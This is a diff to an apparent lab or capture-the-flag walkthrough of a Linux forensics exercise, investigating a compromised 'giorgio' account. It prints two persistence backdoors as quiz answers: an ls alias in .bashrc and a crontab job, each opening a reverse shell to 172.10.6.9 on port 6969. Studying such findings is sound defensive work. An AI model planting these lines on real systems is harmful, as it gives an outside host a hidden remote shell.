@@ -44,7 +44,7 @@ This will give us the distribution-specific information we're looking for.  We c
 
 **Answer:** Ubuntu 20.04.4 LTS  
 
-### Investigating the giorgio account
+### Task 2: Investigating the giorgio account
 
 > Since we're in the giorgio account already, we might as well have a look around.
 
@@ -58,10 +58,32 @@ A name that on the nose can't be anything healthy.  Best not to run it.
 
 **Answer:** .bad_bash
 
+> In every investigation, it's important to keep a dirty wordlist to keep track of all your findings, no matter how small. It's also a way to prevent going back in circles and starting from scratch again. As such, now's a good time to create one and put the previous answer as an entry so we can go back to it later.
+
+More on this later.
+
 ##### Another file that can be found in every user's home directory is the .bashrc file. Can you check if you can find something interesting in giorgio's .bashrc?
 
 Running a `cat` command on .bashrc immediately shows us a concerning alias:
 
 ![.bashrc](/assets/img/uploads/bashrc.png ".bashrc")
 
-The `ls` command has been a given an alias that attempts to create a reverse shell before listing the directory contents!
+The `ls` command has been assigned an alias that attempts to create a reverse shell to `172.10.6.9` on port `6969` before listing the directory contents.  The command even runs the process in the background and "disowns" it so the connection remains active if the shell session ends!
+
+I'd call that interesting.
+
+**Answer:** alias ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'
+
+> It seems we've covered the usual bases in giorgio's home directory, so it's time to check the scheduled tasks that he owns.
+
+##### Did you find anything interesting about scheduled tasks?
+
+To see the scheduled tasks on a Linux system, we can run `crontab -l`:
+
+![crontab -l](/assets/img/uploads/crontab-l.png "crontab -l")
+
+We see one job scheduled, and it's attempting to create a reverse shell to the same address and port as before. How "persistent."
+
+**Answer:** /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f
+
+### Task 3: Dirty Wordlist Revisited
